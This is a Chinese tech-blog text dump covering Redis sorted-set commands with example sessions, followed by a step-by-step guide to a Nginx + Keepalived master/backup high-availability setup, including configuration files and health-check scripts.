0 分数不仅可以是整数，还支持双精度浮点数，其中 +inf 和 -inf 分别表示正无穷和负无穷。 1234567891011redis&gt; ZADD testboard 17E+307 a(integer) 1redis&gt; ZADD testboard 1.5 b(integer) 1redis&gt; ZADD testboard `+inf`c(integer) 1redis&gt; ZADD testboard `-inf` d(integer) 1 获取元素的分数1ZSCORE key member 示例： 12redis&gt; ZSCORE scoreboard Tom"89" 获得排名在某个范围的元素列表ZRANGE 命令会按照元素分数从小到大的顺序返回索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop）。ZRANGE 命令与 LRANGE 命令十分类似，如索引都是从 0 开始，负数代表从后向前查找（−1 表示最后一个元素）。 123ZRANGE key start stop [WITHSCORES]ZREVRANGE key start stop [WITHSCORES] 示例： 1234567891011redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGE scoreboard 0 21) "Peter"2) "Tom"3) "Jim"redis&gt; ZRANGE scoreboard 1 -11) "Tom"2) "Jim" 如果需要同时获得元素的分数的话，可以在 ZRANGE 命令的尾部加上 WITHSCORES 参数： 1234567redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES1) "Peter"2) "67"3) "Tom"4) "89"5) "Jim"6) "100" ZRANGE 命令的时间复杂度为 O (log n+m)，其中 n 为有序集合的基数，m 为返回的元素个数。如果两个元素的分数相同，Redis 会按照字典顺序（即 0 &lt; 9 &lt; A &lt; Z &lt; a &lt; z 的顺序）来进行排列。如果元素的值是中文，那么排列顺序取决于中文的编码方式，例如使用 UTF-8 编码时排列顺序如下，可见此时 Redis 依然是按照字典顺序排列这些元素。 12345678redis&gt; ZADD chineseName 0 马华 0 刘墉 0 司马光 0 赵哲(integer) 4redis&gt; ZRANGE chineseName 0 -11) "\\xe5\\x88\\x98\\xe5\\xa2\\x89"2) "\\xe5\\x8f\\xb8\\xe9\\xa9\\xac\\xe5\\x85\\x89"3) "\\xe8\\xb5\\xb5\\xe5\\x93\\xb2"4) "\\xe9\\xa9\\xac\\xe5\\x8d\\x8e" ZREVRANGE 命令与 ZRANGE 命令的唯一不同在于 ZREVRANGE 命令是按照元素的分数从大到小的顺序输出结果。 1234567redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES1) "Jim"2) "100"3) "Tom"4) "89"5) "Peter"6) "67" 获得指定分数范围的元素ZRANGEBYSCORE 命令参数虽然多，但是都很好理解。该命令按照元素分数从小到大的顺序返回分数在 min 和 max 之间（包含 min 和 max ）的元素。值得注意的是，ZREVRANGEBYSCORE 命令不仅是按照元素分数从大往小的顺序输出结果，而且它的 min 和 max 参数的位置与 ZRANGEBYSCORE 命令是相反的。 123ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]ZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count] 示例： 123456redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGEBYSCORE scoreboard 80 1001) "Tom"2) "Jim" 如果希望分数范围不包含端点值，可以在分数前加上 “(” 符号。例如，希望返回 80 分到 100 分的数据，可以含 80 分，但不包含 100 分，则命令如下： 12redis&gt; ZRANGEBYSCORE scoreboard 80 (1001) "Tom" min 和 max 还支持无穷值，这和 ZADD 命令一样，其中 +inf 和 -inf 分别表示正无穷和负无穷。比如希望得到分数高于 80 分（不包含 80 分）的人的名单，但却不知道最高分是多少，这时候就可以用上 +inf： 123redis&gt; ZRANGEBYSCORE scoreboard (80 +inf1) "Tom"2) "Jim" LIMIT offset count 与 SQL 中的用法基本相同，即在获得的元素列表的基础上向后偏移 offset 个元素，并且只获取 count 个元素。例如下面的例子中，表示获得分数高于 60 分的，并从第二个人开始的 3 个人： 123456789101112131415161718redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Peter" 4) "67" 5) "Yvonne" 6) "67" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZRANGEBYSCORE scoreboard 60 +inf LIMIT 1 31) "Yvonne"2) "Tom"3) "Wendy" 如果想获取分数低于或等于 100 分的前 3 个人，可以借助 ZREVRANGEBYSCORE 命令实现。ZREVRANGEBYSCORE 命令不仅是按照元素分数从大往小的顺序输出结果，而且它的 min 和 max 参数的位置与 ZRANGEBYSCORE 命令是相反的。 123456789101112131415161718redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES 1) "Jim" 2) "100" 3) "Wendy" 4) "92" 5) "Tom" 6) "89" 7) "Yvonne" 8) "67" 9) "Peter"10) "67"11) "Jerry"12) "56"redis&gt; ZREVRANGEBYSCORE scoreboard 100 0 LIMIT 0 31) "Jim"2) "Wendy"3) "Tom" 增减某个元素的分数ZINCRBY 命令可以增加一个元素的分数，返回值是更改后的分数。 1ZINCRBY key increment member 示例： 12345678redis&gt; ZSCORE scoreboard Peter"67"redis&gt; ZINCRBY scoreboard 6 Peter"73"redis&gt; ZSCORE scoreboard Peter"73" increment 也可以是个负数表示减分，例如给 Peter 减 4 分： 12redis&gt; ZINCRBY scoreboard -4 Peter"69" 如果指定的元素不存在，Redis 在执行命令前会先建立它并将它的分数值赋为 0，然后再执行增减操作。 获取集合中元素的数量1ZCARD key 示例： 12redis&gt; ZCARD scoreboard(integer) 6 获得指定分数范围内的元素个数ZCOUNT 命令的 min 和 max 参数的特性与 ZRANGEBYSCORE 命令中的一样。 1ZCOUNT key min max 示例： 12345678910111213141516171819redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Yvonne" 4) "67" 5) "Peter" 6) "69" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZCOUNT scoreboard 90 100(integer) 2redis&gt; ZCOUNT scoreboard (80 +inf(integer) 3 删除一个或多个元素ZREM 命令的返回值是成功删除的元素数量（不包含本来就不存在的元素）。 1ZREM key member [member …] 示例： 12345redis&gt; ZREM scoreboard Wendy(integer) 1redis&gt; ZCARD scoreboard(integer) 5 按照排名范围删除元素ZREMRANGEBYRANK 命令按照元素分数从小到大的顺序（即索引 0 表示最小的值）删除处在指定排名范围内的所有元素，并返回删除的元素数量。 1ZREMRANGEBYRANK key start stop 示例： 12345678910redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYRANK testRem 0 2(integer) 3redis&gt; ZRANGE testRem 0 -11) "d"2) "e"3) "f" 按照分数范围删除元素ZREMRANGEBYSCORE 命令会删除指定分数范围内的所有元素，参数 min 和 max 的特性和 ZRANGEBYSCORE 命令中的一样，返回值是删除的元素数量。 1ZREMRANGEBYSCORE key min max 示例： 123456789101112redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYSCORE testRem (4 5(integer) 1redis&gt; ZRANGE testRem 0 -11) "a"2) "b"3) "c"4) "d"5) "f" 获得元素的排名123ZRANK key memberZREVRANK key member ZRANK 命令会按照元素分数从小到大的顺序获得指定的元素的排名（从 0 开始，即分数最小的元素排名为 0）。 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 1redis&gt; ZRANK testRem b(integer) 1 ZREVRANK 命令则与 ZRANK 命令相反，分数最大的元素排名为 0。 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREVRANK testRem f(integer) 0 计算有序集合的交集ZINTERSTORE 命令用来计算多个有序集合的交集并将结果存储在 destination 键中（同样以有序集合类型存储），返回值为 destination 键中的元素个数，若 destination 键已存在则会被覆盖。其中 destination 键中元素的分数是由 AGGREGATE 参数决定的。 1ZINTERSTORE destination numkeys key [key …] [WEIGHTS weight [weight…]] [AGGREGATE SUM|MIN|MAX] 当 AGGREGATE 是 SUM 时（也就是默认值），destination 键中元素的分数是每个参与计算的集合中该元素分数的和。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "11"3) "b"4) "22" 当 AGGREGATE 是 MIN 时，destination 键中元素的分数是每个参与计算的集合中该元素分数的最小值。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MIN(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "1"3) "b"4) "2" 当 AGGREGATE 是 MAX 时，destination 键中元素的分数是每个参与计算的集合中该元素分数的最大值。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MAX(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "10"3) "b"4) "20" 计算有序集合的并集ZUNIONSTORE 命令用于计算集合间的并集，与 ZINTERSTORE 命令的使用方法一样，这里不再累述。 1ZUNIONSTORE destination numkeys key [key …] [WEIGHTS weight [weight…]] [AGGREGATE SUM|MIN|MAX] 数据类型使用总结 数据类型 结构存储的值 结构的读写能力 博客系统中的应用 字符串类型 可以是字符串、整数或者浮点数 对整个字符串或字符串的其中一部分执行操作；对整数和浮点数执行自增或者自减操作 （1） 博客文章访问量统计（2）生成自增 ID 散列类型 包含键值对的无序散列表 添加、获取、移除单个键值对；获取所有键值对 （1）存储文章数据（2）存储文章缩略名 列表类型 一个双向链表，链表上的每个节点都包含了一个字符串 从链表的两端推入或者弹出元素；根据偏移量对链表进行修剪（Trim）；读取单个或多个元素；根据值查找或者移除元素 （1）存储文章 ID 列表（2）存储评论列表 集合类型 包含字符串的无序收集器，并且被包含的每个字符串都不可重复 添加、获取、移除单个元素；检查一个元素是否存在于集合中；计算交集、并集、差集；从集合里面随机获取元素 （1）存储文章标签（2）通过标签搜索文章 有序集合类型 字符串成员与浮点数分值之间的有序映射，元素的排列顺序由分值的大小决定 添加、获取、删除单个元素；根据分值范围或者成员来获取元素 （1）实现按点击量排序（2）更改文章发布时间和获得指定时间范围内的文章列表 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"缓存"},{title:"Nginx + Keepalived 实现双机主备高可用",url:"/posts/503c34e4.html",text:'前言负载均衡的实现 TCP 层实现的负载均衡，例如：LVS（调度性能强悍） 应用层实现的负载均衡，例如：Nginx、Haproxy、Apache (mod_proxy)、Varnish、Squid、Ribbon Keepalived 概述Keepalived 简介 Keepalived 是 Linux 下一个轻量级别的高可用开源解决方案，高可用 (High Avalilability)，其实两种不同的含义：广义来讲，是指整个系统的高可用行，狭义的来讲就是之主机的冗余和接管，它与 HeartBeat RoseHA 实现相同类似的功能，都可以实现服务或者网络的高可用；但是又有差别，HeartBeat 是一个专业的、功能完善的高可用软件，它提供了 HA 软件所需的基本功能，比如：心跳检测、资源接管、检测集群中的服务、在集群节点转移共享 IP 地址的所有者等等。HeartBeat 功能强大，但是部署和使用相对比较麻烦，与 HeartBeat 相比，Keepalived 主要是通过虚拟路由冗余来实现高可用功能，虽然它没有 HeartBeat 功能强大，但是 Keepalived 部署和使用非常的简单，所有配置只需要一个配置文件即可以完成。Keepalived 实现了轻量级的高可用，一般用于前端高可用，且不需要共享存储，一般常用于两个节点的高可用。而 Heartbeat 用于服务的高可用，且需要共享存储，一般用于多节点的高可用。 Keepalived 起初是专为 LVS 设计的，用来管理并监控 LVS 集群系统中各个服务节点的状态，后来又加入了可以实现高可用的 VRRP 功能。因此，Keepalived 除了能够管理 LVS 软件外，还可以实现任意两台主机之间，例如 Master 和 Backup 主机之间的故障转移和自动切换，这个主机可以是普通的不能停机的业务服务器，也可以是 LVS 负载均衡、Nginx 反向代理这样的服务器。Keepalived 软件主要是通过 VRRP 协议实现高可用功能的，VRRP 是 Virtual Router Redundancy Protocol（虚拟路由冗余协议）的缩写，VRRP 出现的目的就是为了解决静态路由的单点故障问题的，它能保证当个别节点宕机时，整个网络可以不间断、稳定地运行。所以，Keepalived 一方面具有配置管理 LVS 的功能，同时还具有对 LVS 下面节点进行健康检查的功能，另一方面也可以实现系统网络服务的高可用功能。 VRRP 协议与工作原理 在现实的网络环境中，主机之间的通信都是通过配置静态路由或者 (默认网关) 来完成的，而主机之间的路由器一旦发生故障，通信就会失效，因此这种通信模式当中，路由器就成了一个单点瓶颈，为了解决这个问题，就引入了 VRRP 协议，它是一种主备模式的协议，通过 VRRP 可以在网络发生故障时透明的进行设备切换而不影响主机之间的数据通信，这其中涉及到两个概念：物理路由器和虚拟路由器。 VRRP 可以将两台或者多台物理路由器设备虚拟成一个虚拟路由，这个虚拟路由器通过虚拟 IP（一个或者多个) 对外提供服务，而在虚拟路由器内部十多个物理路由器协同工作，同一时间只有一台物理路由器对外提供服务，这台物理路由设备被成为：主路由器（Master 角色)，一般情况下 Master 是由选举算法产生，它拥有对外服务的虚拟 IP，提供各种网络功能，如：ARP 请求，ICMP 数据转发等，而且其它的物理路由器不拥有对外的虚拟 IP，也不提供对外网络功能，仅仅接收 MASTER 的 VRRP 状态通告信息，这些路由器被统称为 “BACKUP 的角色”，当主路由器失败时，处于 BACKUP 角色的备份路由器将重新进行选举，产生一个新的主路由器进入 MASTER 角色，继续提供对外服务，整个切换对用户来说是完全透明的。 每个虚拟路由器都有一个唯一的标识号，称为 VRID，一个 VRID 与一组 IP 地址构成一个虚拟路由器，在 VRRP 协议中，所有的报文都是通过 IP 多播方式发送的，而在一个虚拟路由器中，只有处于 Master 角色的路由器会一直发送 VRRP 数据包，处于 BACKUP 角色的路由器只会接受 Master 角色发送过来的报文信息，用来监控 Master 运行状态，一般不会发生 BACKUP 抢占的情况，除非它的优先级更高，而当 MASTER 不可用时，BACKUP 也就无法收到 Master 发过来的信息，于是就认定 Master 出现故障，接着多台 BAKCUP 就会进行选举，优先级最高的 BACKUP 将称为新的 MASTER，这种选举角色切换非常之快（&lt; 1s），因而保证了服务的持续可用性。 Keepalvied 的工作原理 Keepalived 通过 VRRP 实现高可用，作为一个高性能集群软件，它还能实现对集群中服务器运行状态的监控以及故障隔离。Keepalived 工作在 TCP/IP 参考模型的 三层、四层、五层，也就是分别为：网络层，传输层和应用层，根据 TCP、IP 参数模型隔层所能实现的功能，Keepalived 运行机制如下： 在网络层： 运行 4 个重要的协议：互联网络 IP 协议，互联网络可控制报文协议 ICMP、地址转换协议 ARP、反向地址转换协议 RARP，Keepalived 在网络层采用最常见的工作方式是通过 ICMP 协议向服务器集群中的每一个节点发送一个 ICMP 数据包 (有点类似与 Ping 的功能)， 如果某个节点没有返回响应数据包，那么认为该节点发生了故障，Keepalived 将报告这个节点失效，并从服务器集群中剔除故障节点； 在传输层： 提供了两个主要的协议：传输控制协议 TCP 和用户数据协议 UDP，传输控制协议 TCP 可以提供可靠的数据输出服务、 IP 地址和端口，代表 TCP 的一个连接端，要获得 TCP 服务，需要在发送机的一个端口和接收机的一个端口上建立连接，而 Keepalived 在传输层里利用了 TCP 协议的端口连接和扫描技术来判断集群节点的端口是否正常，比如对于常见的 WEB 服务器 80 端口。或者 SSH 服务 22 端口，Keepalived 一旦在传输层探测到这些端口号没有数据响应和数据返回，就认为这些端口发生异常，然后强制将这些端口所对应的节点从服务器集群中剔除掉； 在应用层：可以运行 FTP，TELNET，SMTP，DNS 等各种不同类型的高层协议，Keepalived 的运行方式也更加全面化和复杂化，用户可以通过自定义 Keepalived 工作方式，例如：可以通过编写程序或者脚本来运行 Keepalived，而 Keepalived 将根据用户的设定参数检测各种程序或者服务是否允许正常，如果 Keepalived 的检测结果和用户设定的不一致时，Keepalived 将把对应的服务器从服务器集群中剔除； Keepalived 高可用服务对之间的故障切换转移，是通过 VRRP 来实现的。在 Keepalived 服务工作时，主 Master 节点会不断地向备节点发送（多播的方式）心跳消息，用来告诉备 Backup 节点自己还活着。当主节点发生故障时，就无法发送心跳的消息了，备节点也因此无法继续检测到来自主节点的心跳了。于是就会调用自身的接管程序，接管主节点的 IP 资源和服务。当主节点恢复时，备节点又会释放主节点故障时自身接管的 IP 资源和服务，恢复到原来的备用角色。 Keepalived 的体系结构 简单模块介绍： 1）SchedulerI/OMultiplexer 是一个 I/O 复用分发调度器，它负载安排 Keepalived 所有内部的任务请求 2）Memory Mngt 是一个内存管理机制，这个框架提供了访问内存的一些通用方法 3）Control Plane 是 Keepalived 的控制版面，可以实现对配置文件编译和解析 4）Core componets 这部分主要包含了 5 个部分 a）看门狗 (Watchdog) ：是计算机可靠领域中极为简单又非常有效的检测工具，Keepalived 正是通过它监控 Checkers 和 VRRP 进程的 b）检查者 (Checkers) : 是 Keepalived 最基础、最主要的功能，可以实现对服务器运行状态检测和故障隔离 c）VRRP 模块 (VRRP Stack) : 是 Keepalived 引用 VRRP 功能，可以实现 HA 集群中失败切换功能，负责负载均衡器之间的失败切换 FailOver d）IPVS 模块 (IPVS wrapper) : 是 IPVS 功能的一个实现，IPVSwarrper 模块将可以设置好的 IPVS 规则发送的内核空间并且提供给 IPVS 模块，最终实现 IPVS 模块的负载功能 e）VIP 切换 (Netlink Reflector) ：用来实现高可用集群 Failover 时虚拟 IP (VIP) 的设置和切换 由上图可知，两个子进程都被系统 WatchDog 看管，healthchecker 子进程实现检查各自服务器的健康程度，例如 HTTP、LVS 等等，如果 healthchecker 子进程检查到 MASTER 上服务不可用，就会通知本机上的兄弟 VRRP 子进程，让它删除通告，并且去掉虚拟 IP，转换为 BACKUP 状态 Nginx + Keepalived 搭建高可用集群部署架构图本文采用的是 Nginx + Keepalived 双机主备架构（主从模式），即使用一个 VIP 地址，Nginx 使用 2 台机器，一台做主节点（Master），一台做备节点（Backup），但同时只有一台机器工作，另一台备用机器在主机器不出现故障的时候，处于空闲状态，仅仅用于灾备。 服务器规划 角色 IP 软件 运行环境 Master 节点 192.168.1.163 CentOS 7、Nginx、Keepalived Vbox 虚拟机 Backup 节点 192.168.1.109 CentOS 7、Nginx、Keepalived VBox 虚拟机 准备工作关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 软件安装要求在 Master 与 Backup 节点上都安装好 Nginx 和 Keepalived，建议使用编译安装的方式。在生产环境中，Nginx 与 Keepalived 也可以安装在不用的物理机器上。 Nginx 编译安装12345# 创建nginx用户组# groupadd nginx# 创建nginx用户（不允许远程登录）# useradd -g nginx nginx -s /bin/false 12# 安装依赖# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel 1234567891011121314151617181920212223242526272829303132# 下载# wget http://nginx.org/download/nginx-1.17.1.tar.gz# 解压# tar -xvf nginx-1.17.1.tar.gz# 进入解压目录# cd nginx-1.17.1# 配置./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# 编译安装# make &amp;&amp; make install# 后台启动Nginx# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf# 验证访问Nginx# curl -X GET 127.0.0.1# 查看Nginx的运行状态# ps -aux|grep nginx Keepalived 编译安装12# 安装依赖# yum -y install curl gcc libnl3-devel net-snmp-devel libnl libnl-devel libnfnetlink-devel openssl openssl-devel 1234567891011121314151617181920212223242526272829303132## Keepalived官网下载地址：https://www.keepalived.org/download.html# 下载# wget http://keepalived.org/software/keepalived-2.0.18.tar.gz# 解压# tar -xvf keepalived-2.0.18.tar.gz# 进入解压目录# cd keepalived-2.0.18# 配置# ./configure --prefix=/usr/local/keepalived# 确保 "./configure" 命令执行完后，输出的以下支持项都为Yesfwmark socket support : YesUse VRRP Framework : YesUse VRRP VMAC : YesUse VRRP authentication : YesWith ip rules/routes : Yes# 编译安装# make &amp;&amp; make install# 创建存放Keepalived配置文件的目录# mkdir -p /etc/keepalived# 拷贝Keepalived默认的配置文件# cp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived# 设置Keepalived开机自启动# systemctl enable keepalived.service Keepalived 核心配置在 Makster 和 Backup 节点分别创建检查 Nginx 健康状态的脚本 /etc/keepalived/nginx_check.sh 123456789#!/bin/bashA=`ps -C nginx --no-header | wc -l`if [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf sleep 2 if [ `ps -C nginx --no-header | wc -l` -eq 0 ];then killall keepalived fifi 12# 脚本授权执行# chmod +x /etc/keepalived/nginx_check.sh Keepalived 是服务器级别的，只监控服务器，Nginx 宕机了，是没有办法接管的。比如，这里是用 Nginx 做负载均衡分发请求的数据包的，如果 Master 节点的 Keepalived 服务正常运行，而 Nginx 运行异常，那么将会出现 Nginx 负载均衡服务失灵，无法切换到 Nginx 备用的负载均衡器上，后端的 Web 服务器无法收到请求。所以，应该要检测 Nginx 的服务是否正常运行，如果不是正常运行，首先尝试启动 Nginx 的服务；若 Nginx 重启失败，就应该关闭掉该节点上的 Keepalived 的服务，这样才能自动切换到 Keepalived 的 Backup 节点上。 Keepalived 的配置示例如下： 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc # 指定收件人 } # notification_email_from Alexandre.Cassen@firewall.loc # 指定发件人 # smtp_server 192.168.200.1 # SMTP服务器地址 # smtp_connect_timeout 30 # SMTP服务器连接超时时间 router_id LVS_1 # 必填，标识本节点的字符串，在不同的Keepalived服务器里唯一，通常为hostname，但不一定非得是hostname，故障发生时，发邮件通知时会用到 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" # 检测服务健康状态的Shell脚本 interval 2 # 每隔多长时间探测一次 weight -20 # 如果条件成立的话，则权重-20}vrrp_instance VI_1 { # 定义虚拟路由，VI_1为虚拟路由的标示符，可以是自定义名称，允许定义多个虚拟路由 state MASTER # 必填，可以是MASTER或BACKUP，不过当其他节点Keepalived启动时会将Priority比较大的节点选举为MASTER interface enp0s3 # 必填，节点固有IP（非VIP）的网卡，用来发VRRP包做心跳检测 mcast_src_ip 192.168.1.109 # 本机的IP virtual_router_id 51 # 必填，虚拟路由ID，取值在0-255之间，用来区分多个Instance的VRRP组播，同一网段内ID不能重复，主备机器的该值必须为一样 priority 100 # 必填，用来选举Master的，要成为Master那么这个选项的值最好高于其他机器50个点，该项取值范围是1-255(在此范围之外会被识别成默认值100) advert_int 1 # 必填，检查间隔默认为1秒，即1秒进行一次Master选举（可以认为是健康查检时间间隔） authentication { # 必填，认证区域，认证类型有PASS和HA（IPSEC），推荐使用PASS（密码只识别前8位），主备配置必须一样 auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 # 必填，虚拟VIP地址，建议后缀加上"/24"，允许有多个 } track_script { # 检测服务健康状态的Shell脚本 chk_nginx }} 在 Makster 节点创建 Keepalived 的主配置文件 /etc/keepalived/keepalived.conf，配置文件的内容如下： 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_1 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state MASTER interface enp0s3 mcast_src_ip 192.168.1.163 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script { chk_nginx }} 在 Backup 节点创建 Keepalived 的主配置文件 /etc/keepalived/keepalived.conf，配置文件的内容如下，与 Master 节点的最大参数区别是：router_id LVS_2、state BACKUP、mcast_src_ip 192.168.1.109 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_2 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state BACKUP interface enp0s3 virtual_router_id 51 mcast_src_ip 192.168.1.109 priority 90 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script{ chk_nginx }} 分别在 Master 节点和 Backup 节点启动 Keepalived 的服务 123456789# 启动Keepalived# service keepalived start# 查看运行状态# service keepalived status# 查看启动的日志信息# more /var/log/messages# journalctl -u keepalived 测试虚拟 IPMaster 节点查看虚拟 IP在 Master 节点执行以下命令，查看节点的 IP 状态 1# ip addr 在 Master 节点可以看到已经生成了虚拟 IP 192.168.1.186 Backup 节点查看虚拟 IP在 Backup 节点执行以下命令，查看节点的 IP 状态 1# ip addr 在 Backup 节点默认不会看到生成的虚拟 IP，如果生成那就是 Keepalived 的配置文件出现了错误，即备节点和主节点争用 IP 资源，这个现象叫做 脑裂 使用虚拟 IP 访问 Nginx分别在 Master 节点和 Backup 节点上，验证是否可通过虚拟 IP 访问本地的 Nginx 服务 12345# 确保可以Ping得通虚拟IP# ping 192.168.1.186# 访问Nginx# curl -X GET 192.168.1.186 值得一提的是，建议额外在宿主机上测试是否可以访问 VIP 主备服务器高可用切换关闭 Master 节点的 Keepalived 服务 1# service keepalived stop 查看 Backup 节点是否会生成虚拟 IP 192.168.1.186 重新启动 Master 的 Keepalived 服务，然后查看 Master 和 Backup 的虚拟 IP，此时主节点应该会将虚拟 IP 抢夺回来 1# service keepalived restar Keepalived 脑裂（主备节点均有 VIP）脑裂（split-brain）指在一个高可用（HA）系统中，当联系着的两个节点断开联系时，本来为一个整体的系统，分裂为两个独立节点，这时两个节点开始争抢共享资源，结果会导致系统混乱，数据损坏。对于无状态服务的 HA，无所谓脑裂不脑裂；但对有状态服务（比如 MySQL）的 HA，必须要严格防止脑裂。 脑裂原因一般来说脑裂问题有以下这几种原因： 高可用服务器上开启了 iptables 防火墙，阻止了心跳传消息输 高可用服务器上心跳网卡地址等信息配置不正确，导致发送心跳失败 其他服务配置不当的原因，如心跳方式不同，心跳广播冲突，软件 Bug 等 高可用服务器对之间心跳线链路发生故障，导致无法正常通信，例如：心跳线坏了（包括断了或者老化）、网卡及相关驱动损坏、IP 配置及冲突问题（网卡直连）、心跳线之间的设备故障（网卡及交换机）、仲裁的机器出现问题（采用仲裁的方案） 提示：Keepalived 配置里的同一个 VRRP 实例，如果 virtual_router_id 参数在主备节点上的配置不一致，也会导致出现脑裂现象 脑裂方案在实际生产环境中，可以从以下方面防止脑裂： 同时使用串行电缆和以太网电缆连接、同时使用两条心跳线路，这样一条线路断了，另外一条还是好的，依然能传送心跳消息 当检查脑裂时强行关闭一个心跳节点（这个功能需要特殊设备支持，如 stonith、fence）相当于备节点接收不到心跳消息，通过单独的线路发送关机命令关闭主节点的电源 做好对脑裂的监控报警 解决常见方案： 如果开启防火墙，一定要让心跳消息通过，一般通过允许 IP 段的形式解决 可以拉一条以太网网线或者串口线作为主被节点心跳线路的冗余 开发检测程序通过监控软件检测脑裂 脑裂报警脚本监控报警思路，正常情况下 Keepalived 的 VIP 是挂载在 Master 节点上的，如果在 Backup 节点发现了 VIP，同时还可以 Ping 得通 Master 节点，就触发脑裂报警。这种监控思路是假设在 Keepalived 服务自身不会宕机的基础上的，若 Master 节点上的 Keepalived 服务宕机了，VIP 会正常挂载到 Backup 节点上，同时还是可以 Ping 得通 Master 节点，这种极端情况下就会错误触发脑裂警报。 12345678910111213141516#!/bin/bash# 检查脑裂的脚本，在Backup节点上进行部署VIP=192.168.1.186MASTER_IP=192.168.1.163while truedo ping -c 2 -W 3 $MASTER_IP &amp;&gt;/dev/null if [ $? -eq 0 -a `ip add|grep "$VIP"|wc -l` -eq 1 ];then echo "ha is brain." else echo "ha is ok" fi sleep 5done Nginx + Keepalived 高可用部署架构方案 双机主备方案：就是上文介绍过的，使用一个 VIP 地址，前端使用 2 台机器，一台做主节点（Master），一台做备节点（Backup），但同时只有一台机器工作，另一台备用机器在主机器不出现故障的时候，永远处于浪费状态，仅仅用于灾备，平时都是空闲着的。 双主热备方案：弥补了双机主备的缺点，使用 2 个 VIP 地址，前端使用 2 台机器，彼此互为主备，同时有两台机器工作。用户访问之后，DNS 轮询选择访问哪个 VIP，当其中一台机器出现故障，两台机器的请求会转移到同一台机器负载。 